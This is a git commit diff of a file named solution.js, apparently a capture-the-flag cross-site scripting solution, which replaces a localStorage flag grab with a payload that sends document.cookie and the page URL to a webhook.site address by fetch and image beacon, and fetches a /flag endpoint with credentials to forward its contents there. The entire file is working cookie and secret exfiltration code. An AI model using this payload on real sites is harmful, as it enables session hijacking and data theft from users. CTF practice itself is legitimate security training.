6d61a93ce815cfc93f550da2f26b1ddd368ad70c
Aylin Dora <aylin.leblebici@epfl.ch>
2026-03-11 00:08:20 +0100

    Implement fetch and beacon methods for cookie and flag
    Added multiple methods to send cookies and flag data to a webhook.

--- solution.js
+++ solution.js
@@ -1,2 +1,14 @@
-const flag = localStorage.getItem("flag");
-fetch("https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb?flag=" + flag);
+var w = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb';
+var c = document.cookie;
+var l = location.href;
+
+// Method 1: fetch with cookies
+fetch(w + '?c=' + encodeURIComponent(c) + '&u=' + encodeURIComponent(l));
+
+// Method 2: img beacon fallback
+new Image().src = w + '?c=' + encodeURIComponent(c) + '&u=' + encodeURIComponent(l);
+
+// Method 3: try fetching /flag endpoint
+fetch('/flag', {credentials: 'include'})
+  .then(r => r.text())
+  .then(t => fetch(w + '?flag=' + encodeURIComponent(t)));
